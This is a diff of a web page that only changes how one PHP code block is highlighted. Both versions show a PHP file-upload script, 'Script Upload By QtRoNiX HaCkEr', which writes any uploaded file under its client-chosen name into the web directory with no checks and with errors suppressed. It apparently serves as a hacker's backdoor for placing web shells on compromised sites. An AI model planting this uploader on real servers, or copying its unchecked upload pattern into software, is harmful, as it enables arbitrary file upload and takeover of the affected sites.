@@ -37,28 +37,27 @@
 
 <h3>Script Upload By QtRoNiX HaCkEr Source Code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
-echo '&lt;center&gt;&lt;font color="Red" size="4"&gt;';
-/// Script Upload By QtRoNiX HaCkEr \\\
-if(isset($_POST['Submit'])){
-    $filedir = ""; 
-    $maxfile = '2000000';
-    $mode = '0644';
-    $userfile_name = $_FILES['image']['name'];
-    $userfile_tmp = $_FILES['image']['tmp_name'];
-    if(isset($_FILES['image']['name'])) {
-        $qx = $filedir.$userfile_name;
-        @move_uploaded_file($userfile_tmp, $qx);
-        @chmod ($qx, octdec($mode));
-echo"&lt;center&gt;&lt;b&gt;Done ==&gt; $userfile_name&lt;/b&gt;&lt;/center&gt;";
-}
-}
-else{
-echo'&lt;form method="POST" action="#" enctype="multipart/form-data"&gt;&lt;input type="file" name="image"&gt;&lt;br&gt;&lt;input type="Submit" name="Submit" value="Upload"&gt;&lt;/form&gt;';
-}
-echo '&lt;/center&gt;&lt;/font&gt;';
-?&gt;
-</pre>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s1">&#39;&amp;lt;center&amp;gt;&amp;lt;font color=&quot;Red&quot; size=&quot;4&quot;&amp;gt;&#39;</span><span class="p">;</span>
+<span class="c1">/// Script Upload By QtRoNiX HaCkEr \\\</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])){</span>
+    <span class="nv">$filedir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
+    <span class="nv">$maxfile</span> <span class="o">=</span> <span class="s1">&#39;2000000&#39;</span><span class="p">;</span>
+    <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">&#39;0644&#39;</span><span class="p">;</span>
+    <span class="nv">$userfile_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+    <span class="nv">$userfile_tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$qx</span> <span class="o">=</span> <span class="nv">$filedir</span><span class="o">.</span><span class="nv">$userfile_name</span><span class="p">;</span>
+        <span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$userfile_tmp</span><span class="p">,</span> <span class="nv">$qx</span><span class="p">);</span>
+        <span class="o">@</span><span class="nb">chmod</span> <span class="p">(</span><span class="nv">$qx</span><span class="p">,</span> <span class="nb">octdec</span><span class="p">(</span><span class="nv">$mode</span><span class="p">));</span>
+<span class="k">echo</span><span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Done ==&amp;gt; </span><span class="si">$userfile_name</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+<span class="k">echo</span><span class="s1">&#39;&amp;lt;form method=&quot;POST&quot; action=&quot;#&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;&amp;lt;input type=&quot;file&quot; name=&quot;image&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=&quot;Submit&quot; name=&quot;Submit&quot; value=&quot;Upload&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s1">&#39;&amp;lt;/center&amp;gt;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
